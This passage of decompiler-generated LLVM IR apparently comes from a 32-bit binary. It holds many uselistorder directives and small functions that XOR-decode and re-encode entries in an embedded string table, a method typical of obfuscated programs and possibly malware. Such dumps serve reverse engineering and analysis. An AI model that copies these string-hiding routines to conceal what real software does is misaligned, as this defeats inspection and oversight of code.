  %v2_8051278 = inttoptr i32 %v1_8051278 to i32*
  %v3_8051278 = load i32, i32* %v2_8051278, align 4
  store i32 %v3_8051278, i32* %ecx.global-to-local, align 4
  %v1_805127c = add i32 %v3_8051278, 13
  %v2_805127c = inttoptr i32 %v1_805127c to i8*
  %v3_805127c = load i8, i8* %v2_805127c, align 1
  %v4_805127c = zext i8 %v3_805127c to i32
  %v5_805127c = load i32, i32* %eax.global-to-local, align 4
  %v6_805127c = and i32 %v5_805127c, -256
  %v7_805127c = or i32 %v6_805127c, %v4_805127c
  store i32 %v7_805127c, i32* %eax.global-to-local, align 4
  %v2_805127f = add i32 %v0_805126e, 24
  %v3_805127f = inttoptr i32 %v2_805127f to i32*
  store i32 %v7_805127c, i32* %v3_805127f, align 4
  %v0_8051280 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051280 = add i32 %v0_8051280, 4
  %v2_8051280 = inttoptr i32 %v1_8051280 to i32*
  %v3_8051280 = load i32, i32* %v2_8051280, align 4
  store i32 %v3_8051280, i32* %eax.global-to-local, align 4
  %v2_8051283 = add i32 %v0_805126e, 20
  %v3_8051283 = inttoptr i32 %v2_8051283 to i32*
  store i32 %v3_8051280, i32* %v3_8051283, align 4
  %v1_8051284 = add i32 %v0_805126e, 64
  %v2_8051284 = inttoptr i32 %v1_8051284 to i32*
  %v3_8051284 = load i32, i32* %v2_8051284, align 4
  store i32 %v3_8051284, i32* %eax.global-to-local, align 4
  %v2_8051288 = add i32 %v0_805126e, 16
  %v3_8051288 = inttoptr i32 %v2_8051288 to i32*
  store i32 %v3_8051284, i32* %v3_8051288, align 4
  %v0_8051289 = call i32 @function_8052984()
  store i32 %v0_8051289, i32* %eax.global-to-local, align 4
  %v0_805128e = load i32, i32* @esp, align 4
  br label %dec_label_pc_80511b1

; uselistorder directives
  uselistorder i64 %v8_805114f, { 1, 0 }
  uselistorder i32 %v1_8051142, { 1, 0 }
  uselistorder i32* %v2_8050347, { 1, 0 }
  uselistorder i32 %v2_805100b, { 1, 0 }
  uselistorder i32 %v3_8051008, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050fa4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050fa3, { 1, 0, 2 }
  uselistorder i16 %v1_8050faf, { 1, 0 }
  uselistorder i64 %v8_8050f90, { 1, 0 }
  uselistorder i32 %v3_8050f23, { 1, 0 }
  uselistorder i32 %v0_8050f23, { 1, 0 }
  uselistorder i32 %v0_8050f1b, { 1, 0 }
  uselistorder i32 %v1_8050e28, { 1, 2, 0 }
  uselistorder i32 %v1_8050daf, { 1, 2, 0 }
  uselistorder i32 %v1_8050d36, { 1, 2, 0 }
  uselistorder i32 %v1_8050cbd, { 1, 2, 0 }
  uselistorder i32 %v0_8050c77, { 1, 0 }
  uselistorder i32 %v0_8050c26, { 1, 0 }
  uselistorder i32 %v0_80510a7, { 1, 0 }
  uselistorder i32 %v7_8050b78, { 1, 0 }
  uselistorder i32 %v0_8050b78, { 1, 2, 0 }
  uselistorder i32 %v6_8050b6b, { 1, 0 }
  uselistorder i32 %v0_8050b6b, { 0, 2, 1 }
  uselistorder i32 %v6_8050b5e, { 1, 0 }
  uselistorder i32 %v2_8050b4a, { 1, 0, 2 }
  uselistorder i32 %v1_8050b47, { 1, 0, 2 }
  uselistorder i32 %v0_8050b44, { 1, 0 }
  uselistorder i32 %v0_8050b40, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_80506c3, { 1, 0 }
  uselistorder i32 %v0_80506c3, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_80506c3, { 0, 2, 1 }
  uselistorder i32 %v0_8050741128, { 1, 0 }
  uselistorder i32 %v1_8050ac0, { 2, 1, 0 }
  uselistorder i32 %v9_8050a8f, { 1, 0 }
  uselistorder i32 %v0_8050d36, { 0, 1, 3, 2 }
  uselistorder i32 %v9_80509fc, { 1, 0 }
  uselistorder i32 %v1_80509f5, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80509f5, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_80509cc, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80509a6, { 1, 2, 0 }
  uselistorder i32 %v1_80509a6, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80509a1, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_8050977, { 1, 0, 2 }
  uselistorder i32 %v0_805094b, { 0, 2, 1 }
  uselistorder i32 %v0_8050924, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32* %v1_8050eab, { 0, 2, 1 }
  uselistorder i32 %v0_80508db, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_80508b2, { 2, 1, 0 }
  uselistorder i32 %v9_8050881, { 1, 0 }
  uselistorder i32 %v0_8050cbd, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805086d, { 2, 1, 0 }
  uselistorder i32 %v9_805083c, { 1, 0 }
  uselistorder i32 %v0_8050daf, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050815, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050805, { 2, 1, 0 }
  uselistorder i32 %v9_80507dd, { 1, 0 }
  uselistorder i32 %v0_8050c6b, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80507bb, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805079d, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8050798, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050788, { 2, 1, 0 }
  uselistorder i32 %v9_8050757, { 1, 0 }
  uselistorder i32 %v0_8050c1a, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8050735, { 1, 0 }
  uselistorder i32 %v0_8050735, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_805072f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805072f, { 0, 2, 1 }
  uselistorder i32 %v0_805072a, { 1, 0 }
  uselistorder i32 %v0_8050705, { 1, 0, 2 }
  uselistorder i32 %v1_80506ec, { 1, 0, 2 }
  uselistorder i32 %v1_80506d0, { 1, 0, 2 }
  uselistorder i32 %v0_8050ae0, { 1, 0, 2 }
  uselistorder i32 %v0_8050acb, { 3, 0, 1, 2 }
  uselistorder i32 %v0_8050741129, { 3, 0, 1, 2 }
  uselistorder i32 %v2_80506c318, { 1, 0 }
  uselistorder i32 %v3_80506aa, { 1, 0 }
  uselistorder i32 %v0_80506aa, { 7, 21, 8, 19, 9, 18, 10, 20, 11, 16, 12, 15, 0, 14, 22, 17, 13, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_8050695, { 0, 2, 1 }
  uselistorder i32 %v0_8050691, { 1, 0 }
  uselistorder i32 %v0_8050678, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_805066e, { 1, 0 }
  uselistorder i32 %v1_8050635, { 2, 1, 0 }
  uselistorder i32 %v9_8050604, { 1, 0 }
  uselistorder i32 %v0_8050e28, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80505f0, { 1, 0 }
  uselistorder i32 %v0_80505f0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80505cf, { 1, 0 }
  uselistorder i32 %v2_80505cc, { 1, 0 }
  uselistorder i32 %v0_80505ca, { 1, 0 }
  uselistorder i32 %v0_80505b7, { 2, 1, 0 }
  uselistorder i32 %v1_80505b4, { 1, 0 }
  uselistorder i32 %v2_80505b1, { 1, 0 }
  uselistorder i32 %v3_80505a5, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v2_8050550, { 1, 0 }
  uselistorder i32 %v1_8050530, { 1, 0 }
  uselistorder i32 %v0_8050530, { 0, 2, 3, 1 }
  uselistorder i32 %v2_805051b, { 1, 0 }
  uselistorder i32 %v3_8050518, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8050ffd, { 1, 0 }
  uselistorder i32 %v1_8050ffa, { 2, 1, 0 }
  uselistorder i32 %v3_80504e0, { 1, 0, 2 }
  uselistorder i32 %v2_80504de, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8050488, { 1, 0 }
  uselistorder i32 %v1_805047d, { 1, 0 }
  uselistorder i32 %v0_805047d, { 1, 0 }
  uselistorder i32 %v0_8050486, { 0, 3, 2, 1 }
  uselistorder i32 %v1_805045a, { 1, 0 }
  uselistorder i32 %v0_805045a, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_805044c, { 1, 0, 2 }
  uselistorder i32 %v4_805040f, { 1, 2, 0 }
  uselistorder i32 %v3_80503de, { 1, 0, 2 }
  uselistorder i32 %v0_8050362, { 0, 2, 1 }
  uselistorder i32 %v0_8050359, { 0, 3, 2, 1 }
  uselistorder i32 %v0_805011d65, { 1, 0 }
  uselistorder i32 %v0_805033a, { 2, 1, 0 }
  uselistorder i8 %v1_805030c, { 1, 0 }
  uselistorder i8 %v2_80502e6, { 0, 4, 5, 6, 7, 8, 10, 9, 3, 2, 1 }
  uselistorder i32 %v2_80502dd, { 4, 8, 6, 1, 0, 2, 3, 5, 7 }
  uselistorder i32 %v5_80502db, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_80502d5, { 3, 0, 1, 2 }
  uselistorder i32 %v1_80502d0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050283, { 1, 0 }
  uselistorder i32 %v0_80501d3, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_80501ce, { 1, 0 }
  uselistorder i32 %v1_80501ab, { 0, 2, 1 }
  uselistorder i32 %v0_805010b, { 2, 0, 1 }
  uselistorder i32 %v0_80500cd, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 10, 34, 36, 29, 37, 19, 0, 17, 21, 22, 23, 25, 26, 27, 38, 39, 40, 30, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 18, 20, 24, 28, 31, 32, 33, 41, 42, 55, 54, 43, 35, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 17, 18, 19, 20, 21, 22, 14, 23, 24, 8, 0, 7, 9, 15, 1, 25, 6, 10, 11, 12, 13, 16, 26, 39, 40, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %eax.global-to-local, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 126, 56, 138, 139, 57, 140, 141, 142, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 121, 122, 123, 58, 59, 60, 61, 62, 63, 155, 156, 157, 158, 159, 160, 89, 90, 91, 92, 93, 94, 95, 0, 1, 2, 3, 4, 5, 80, 81, 82, 83, 84, 85, 86, 98, 99, 100, 101, 102, 106, 107, 108, 109, 110, 111, 112, 113, 166, 167, 168, 169, 181, 133, 170, 171, 172, 173, 124, 134, 125, 127, 128, 129, 130, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 161, 162, 163, 164, 165, 65, 68, 66, 67, 69, 70, 71, 72, 73, 64, 74, 75, 76, 77, 78, 79, 87, 88, 96, 97, 103, 104, 105, 114, 115, 116, 117, 118, 119, 120, 131, 132, 135, 136, 137, 174, 175, 176, 177, 178, 179, 180, 182, 230, 231, 232, 228, 229, 233, 223, 224, 225, 226, 227, 183, 184, 185, 186, 187, 188, 189, 190, 191, 145, 192, 197, 193, 194, 195, 196, 198, 199, 200, 201, 202, 203, 204, 205, 54, 220, 222, 221, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219 }
  uselistorder i32 (i32)* @function_804f300, { 1, 0 }
  uselistorder i32 ()* @function_80528b0, { 1, 0 }
  uselistorder i32 1864, { 1, 2, 0, 3 }
  uselistorder i8 31, { 0, 2, 3, 1 }
  uselistorder i32 1888, { 4, 0, 1, 2, 3 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 1, 0, 2 }
  uselistorder i32 ()* @function_805226f, { 1, 0 }
  uselistorder i32 1872, { 0, 2, 1 }
  uselistorder i32 (i8)* @function_80512d0, { 2, 3, 8, 7, 0, 6, 1, 5, 4, 9, 10, 32, 33, 34, 35, 36, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32*)* @function_80512a0, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 48, 37, 38, 39, 54, 55, 56, 57, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53 }
  uselistorder i32 1880, { 0, 1, 2, 3, 4, 5, 10, 8, 6, 9, 7 }
  uselistorder i32 (i8)* @function_8051350, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 11, 12, 13, 14, 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 15, 16, 10, 17 }
  uselistorder i32 ()* @function_8051d50, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 3, 2, 1, 13, 12, 11, 10, 9, 8, 0, 7, 6, 5, 4 }
  uselistorder i32 ()* @function_8052984, { 21, 20, 19, 18, 17, 16, 15, 6, 5, 3, 2, 12, 11, 25, 24, 14, 13, 10, 9, 8, 7, 23, 22, 4, 1, 0 }
  uselistorder i8 -5, { 0, 3, 1, 2 }
  uselistorder i8 -3, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @function_805290e, { 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 5, 3, 2, 4, 0, 1, 6 }
  uselistorder i8 35, { 6, 4, 3, 5, 1, 0, 2 }
  uselistorder i8 36, { 6, 4, 3, 5, 1, 0, 2, 7 }
  uselistorder i8 62, { 7, 4, 5, 3, 6, 1, 0, 2 }
  uselistorder i8 58, { 7, 4, 5, 3, 6, 1, 0, 2, 8, 9 }
  uselistorder i32 (i32*)* @function_8052502, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 ()* @function_8052448, { 2, 1, 0 }
  uselistorder i32 1572, { 1, 2, 0 }
  uselistorder i32 1700, { 2, 0, 1 }
  uselistorder i32 ()* @function_804f800, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i8 6, { 0, 5, 6, 7, 8, 3, 4, 2, 9, 1 }
  uselistorder i32 ()* @function_8052941, { 1, 0 }
  uselistorder i32 -28, { 3, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4 }
  uselistorder i32 -20, { 2, 1, 3, 4, 0, 5 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 (i32)* @function_804f070, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_8056976.38, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80511c7, { 1, 0 }
  uselistorder label %dec_label_pc_8050fbb, { 1, 0 }
  uselistorder label %dec_label_pc_8050ba8, { 1, 0 }
  uselistorder label %dec_label_pc_8050ad3, { 8, 4, 0, 3, 5, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_80506c3.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8050a8f, { 1, 0 }
  uselistorder label %dec_label_pc_8050a16, { 1, 0 }
  uselistorder label %dec_label_pc_80509e6, { 1, 0 }
  uselistorder label %dec_label_pc_80509ac, { 1, 0 }
  uselistorder label %dec_label_pc_80509a1, { 3, 4, 10, 6, 1, 5, 7, 8, 0, 2, 11, 9 }
  uselistorder label %dec_label_pc_8050881, { 1, 0 }
  uselistorder label %dec_label_pc_805083c, { 1, 0 }
  uselistorder label %dec_label_pc_8050808, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80507dd, { 1, 0 }
  uselistorder label %dec_label_pc_805078b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050757, { 1, 0 }
  uselistorder label %dec_label_pc_8050739, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8050718, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050705, { 1, 0 }
  uselistorder label %dec_label_pc_80506f3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80506c7, { 1, 0 }
  uselistorder label %dec_label_pc_80506c7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805069a, { 1, 0 }
  uselistorder label %dec_label_pc_8050695, { 1, 0 }
  uselistorder label %dec_label_pc_8050653, { 1, 0 }
  uselistorder label %dec_label_pc_805063f, { 1, 0 }
  uselistorder label %dec_label_pc_8050638.loopexit12.loopexit, { 13, 11, 4, 9, 0, 5, 6, 7, 8, 10, 12, 1, 2, 3, 14 }
  uselistorder label %dec_label_pc_8050638.backedge, { 2, 4, 5, 3, 0, 1, 6 }
  uselistorder label %dec_label_pc_8050604, { 1, 0 }
  uselistorder label %dec_label_pc_80505e1, { 5, 6, 7, 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_80505ca, { 1, 0 }
  uselistorder label %dec_label_pc_8050572, { 1, 0 }
  uselistorder label %dec_label_pc_8050521, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder label %dec_label_pc_80504ec, { 1, 0 }
  uselistorder label %dec_label_pc_80504a6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805047d, { 1, 0 }
  uselistorder label %dec_label_pc_8050396, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_805038b, { 1, 0 }
  uselistorder label %dec_label_pc_8050350, { 1, 0 }
  uselistorder label %dec_label_pc_805031a, { 1, 0 }
  uselistorder label %dec_label_pc_80502d0.preheader, { 16, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15 }
  uselistorder label %dec_label_pc_805011d, { 1, 2, 4, 0, 3 }
}

define i32 @function_80512a0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_80512a0:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_80512a8 = icmp eq i32* %arg2, null
  %v1_80512aa = mul i32 %arg1, 8
  store i32 %v1_80512aa, i32* @edx, align 4
  br i1 %v1_80512a8, label %dec_label_pc_80512c3, label %dec_label_pc_80512b9

dec_label_pc_80512b9:                             ; preds = %dec_label_pc_80512a0
  %v1_80512b9 = add i32 %v1_80512aa, add (i32 ptrtoint (i32* @global_var_8056a00.52 to i32), i32 4)
  %v2_80512b9 = inttoptr i32 %v1_80512b9 to i32*
  %v3_80512b9 = load i32, i32* %v2_80512b9, align 4
  %v1_80512bc = urem i32 %v3_80512b9, 65536
  store i32 %v1_80512bc, i32* %arg2, align 4
  %v0_80512c3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80512c3

dec_label_pc_80512c3:                             ; preds = %dec_label_pc_80512a0, %dec_label_pc_80512b9
  %v0_80512c3 = phi i32 [ %v1_80512aa, %dec_label_pc_80512a0 ], [ %v0_80512c3.pre, %dec_label_pc_80512b9 ]
  %v1_80512c3 = add i32 %v0_80512c3, ptrtoint (i32* @global_var_8056a00.52 to i32)
  %v2_80512c3 = inttoptr i32 %v1_80512c3 to i32*
  %v3_80512c3 = load i32, i32* %v2_80512c3, align 4
  ret i32 %v3_80512c3

; uselistorder directives
  uselistorder label %dec_label_pc_80512c3, { 1, 0 }
}

define i32 @function_80512d0(i8 %arg1) local_unnamed_addr {
dec_label_pc_80512d0:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_80512d9 = zext i8 %arg1 to i32
  %v1_80512dd = mul nuw nsw i32 %v4_80512d9, 8
  %v2_80512dd = add i32 %v1_80512dd, ptrtoint (i32* @global_var_8056a00.52 to i32)
  store i32 %v2_80512dd, i32* @ecx, align 4
  %v0_80512e4 = load i16, i16* @global_var_805687c.53, align 2
  %v1_80512e4 = sext i16 %v0_80512e4 to i32
  %v1_80512e9 = add i32 %v1_80512dd, add (i32 ptrtoint (i32* @global_var_8056a00.52 to i32), i32 4)
  %v2_80512e9 = inttoptr i32 %v1_80512e9 to i16*
  %v3_80512e9 = load i16, i16* %v2_80512e9, align 4
  %v4_80512e9 = icmp eq i16 %v3_80512e9, 0
  br i1 %v4_80512e9, label %dec_label_pc_805133a, label %dec_label_pc_80512f0

dec_label_pc_80512f0:                             ; preds = %dec_label_pc_80512d0
  store i32 %v1_80512e4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_80512f8 = udiv i32 %v1_80512e4, 16777216
  %v2_80512fb = udiv i32 %v1_80512e4, 256
  store i32 %v2_80512fb, i32* %edi.global-to-local, align 4
  %v5_80512fe = trunc i32 %v2_80512f8 to i8
  store i8 %v5_80512fe, i8* %stack_var_-44, align 1
  %v2_8051301 = udiv i32 %v1_80512e4, 65536
  store i32 %v2_8051301, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051304

dec_label_pc_8051304:                             ; preds = %dec_label_pc_8051304.dec_label_pc_8051304_crit_edge, %dec_label_pc_80512f0
  %v0_805130a = phi i32 [ %v0_805130a.pre, %dec_label_pc_8051304.dec_label_pc_8051304_crit_edge ], [ %v1_80512e4, %dec_label_pc_80512f0 ]
  %v0_8051306 = phi i32 [ %v1_8051336, %dec_label_pc_8051304.dec_label_pc_8051304_crit_edge ], [ 0, %dec_label_pc_80512f0 ]
  %v0_8051304 = phi i32 [ %v0_805132e, %dec_label_pc_8051304.dec_label_pc_8051304_crit_edge ], [ %v2_80512dd, %dec_label_pc_80512f0 ]
  %v1_8051304 = inttoptr i32 %v0_8051304 to i32*
  %v2_8051304 = load i32, i32* %v1_8051304, align 4
  %v2_8051308 = add i32 %v2_8051304, %v0_8051306
  %v1_805130c = inttoptr i32 %v2_8051308 to i8*
  %v2_805130c = load i8, i8* %v1_805130c, align 1
  %v4_805130c = trunc i32 %v0_805130a to i8
  %v5_805130c = xor i8 %v2_805130c, %v4_805130c
  store i8 %v5_805130c, i8* %v1_805130c, align 1
  %v0_805130e = load i32, i32* @edx, align 4
  %v0_8051310 = load i32, i32* @ecx, align 4
  %v1_8051310 = inttoptr i32 %v0_8051310 to i32*
  %v2_8051310 = load i32, i32* %v1_8051310, align 4
  %v2_8051312 = add i32 %v2_8051310, %v0_805130e
  %v0_8051314 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051316 = inttoptr i32 %v2_8051312 to i8*
  %v2_8051316 = load i8, i8* %v1_8051316, align 1
  %v4_8051316 = trunc i32 %v0_8051314 to i8
  %v5_8051316 = xor i8 %v2_8051316, %v4_8051316
  store i8 %v5_8051316, i8* %v1_8051316, align 1
  %v0_8051318 = load i32, i32* @edx, align 4
  %v0_805131a = load i32, i32* @ecx, align 4
  %v1_805131a = inttoptr i32 %v0_805131a to i32*
  %v2_805131a = load i32, i32* %v1_805131a, align 4
  %v2_805131c = add i32 %v2_805131a, %v0_8051318
  %v0_805131e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051320 = inttoptr i32 %v2_805131c to i8*
  %v2_8051320 = load i8, i8* %v1_8051320, align 1
  %v4_8051320 = trunc i32 %v0_805131e to i8
  %v5_8051320 = xor i8 %v2_8051320, %v4_8051320
  store i8 %v5_8051320, i8* %v1_8051320, align 1
  %v0_8051322 = load i32, i32* @edx, align 4
  %v0_8051324 = load i32, i32* @ecx, align 4
  %v1_8051324 = inttoptr i32 %v0_8051324 to i32*
  %v2_8051324 = load i32, i32* %v1_8051324, align 4
  %v1_8051326 = add i32 %v0_8051322, 1
  store i32 %v1_8051326, i32* @edx, align 4
  %v2_8051327 = add i32 %v2_8051324, %v0_8051322
  %v2_8051329 = load i8, i8* %stack_var_-44, align 1
  %v1_805132c = inttoptr i32 %v2_8051327 to i8*
  %v2_805132c = load i8, i8* %v1_805132c, align 1
  %v5_805132c = xor i8 %v2_805132c, %v2_8051329
  store i8 %v5_805132c, i8* %v1_805132c, align 1
  %v0_805132e = load i32, i32* @ecx, align 4
  %v1_805132e = add i32 %v0_805132e, 4
  %v2_805132e = inttoptr i32 %v1_805132e to i32*
  %v3_805132e = load i32, i32* %v2_805132e, align 4
  %v1_8051331 = urem i32 %v3_805132e, 65536
  %v1_8051336 = load i32, i32* @edx, align 4
  %v8_8051338 = icmp sgt i32 %v1_8051331, %v1_8051336
  br i1 %v8_8051338, label %dec_label_pc_8051304.dec_label_pc_8051304_crit_edge, label %dec_label_pc_805133a.loopexit

dec_label_pc_8051304.dec_label_pc_8051304_crit_edge: ; preds = %dec_label_pc_8051304
  %v0_805130a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051304

dec_label_pc_805133a.loopexit:                    ; preds = %dec_label_pc_8051304
  br label %dec_label_pc_805133a

dec_label_pc_805133a:                             ; preds = %dec_label_pc_805133a.loopexit, %dec_label_pc_80512d0
  %v0_8051341 = phi i32 [ %v1_8051331, %dec_label_pc_805133a.loopexit ], [ %v1_80512e4, %dec_label_pc_80512d0 ]
  ret i32 %v0_8051341

; uselistorder directives
  uselistorder i32 %v1_8051336, { 1, 0 }
  uselistorder i32 %v1_8051331, { 1, 0 }
  uselistorder i32 %v0_805132e, { 1, 0 }
  uselistorder i32 %v1_80512e4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_8051350(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051350:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051359 = zext i8 %arg1 to i32
  %v1_805135d = mul nuw nsw i32 %v4_8051359, 8
  %v2_805135d = add i32 %v1_805135d, ptrtoint (i32* @global_var_8056a00.52 to i32)
  store i32 %v2_805135d, i32* %ecx.global-to-local, align 4
  %v0_8051364 = load i16, i16* @global_var_805687c.53, align 2
  %v1_8051364 = sext i16 %v0_8051364 to i32
  %v1_8051369 = add i32 %v1_805135d, add (i32 ptrtoint (i32* @global_var_8056a00.52 to i32), i32 4)
  %v2_8051369 = inttoptr i32 %v1_8051369 to i16*
  %v3_8051369 = load i16, i16* %v2_8051369, align 4
  %v4_8051369 = icmp eq i16 %v3_8051369, 0
  br i1 %v4_8051369, label %dec_label_pc_80513ba, label %dec_label_pc_8051370

dec_label_pc_8051370:                             ; preds = %dec_label_pc_8051350
  store i32 %v1_8051364, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8051378 = udiv i32 %v1_8051364, 16777216
  %v2_805137b = udiv i32 %v1_8051364, 256
  store i32 %v2_805137b, i32* %edi.global-to-local, align 4
  %v5_805137e = trunc i32 %v2_8051378 to i8
  store i8 %v5_805137e, i8* %stack_var_-44, align 1
  %v2_8051381 = udiv i32 %v1_8051364, 65536
  store i32 %v2_8051381, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051384

dec_label_pc_8051384:                             ; preds = %dec_label_pc_8051384.dec_label_pc_8051384_crit_edge, %dec_label_pc_8051370
  %v0_805138a = phi i32 [ %v0_805138a.pre, %dec_label_pc_8051384.dec_label_pc_8051384_crit_edge ], [ %v1_8051364, %dec_label_pc_8051370 ]
  %v0_8051386 = phi i32 [ %v1_80513b6, %dec_label_pc_8051384.dec_label_pc_8051384_crit_edge ], [ 0, %dec_label_pc_8051370 ]
  %v0_8051384 = phi i32 [ %v0_80513ae, %dec_label_pc_8051384.dec_label_pc_8051384_crit_edge ], [ %v2_805135d, %dec_label_pc_8051370 ]
  %v1_8051384 = inttoptr i32 %v0_8051384 to i32*
  %v2_8051384 = load i32, i32* %v1_8051384, align 4
  %v2_8051388 = add i32 %v2_8051384, %v0_8051386
  %v1_805138c = inttoptr i32 %v2_8051388 to i8*
  %v2_805138c = load i8, i8* %v1_805138c, align 1
  %v4_805138c = trunc i32 %v0_805138a to i8
  %v5_805138c = xor i8 %v2_805138c, %v4_805138c
  store i8 %v5_805138c, i8* %v1_805138c, align 1
  %v0_805138e = load i32, i32* %edx.global-to-local, align 4
  %v0_8051390 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051390 = inttoptr i32 %v0_8051390 to i32*
  %v2_8051390 = load i32, i32* %v1_8051390, align 4
  %v2_8051392 = add i32 %v2_8051390, %v0_805138e
  %v0_8051394 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051396 = inttoptr i32 %v2_8051392 to i8*
  %v2_8051396 = load i8, i8* %v1_8051396, align 1
  %v4_8051396 = trunc i32 %v0_8051394 to i8
  %v5_8051396 = xor i8 %v2_8051396, %v4_8051396
  store i8 %v5_8051396, i8* %v1_8051396, align 1
  %v0_8051398 = load i32, i32* %edx.global-to-local, align 4
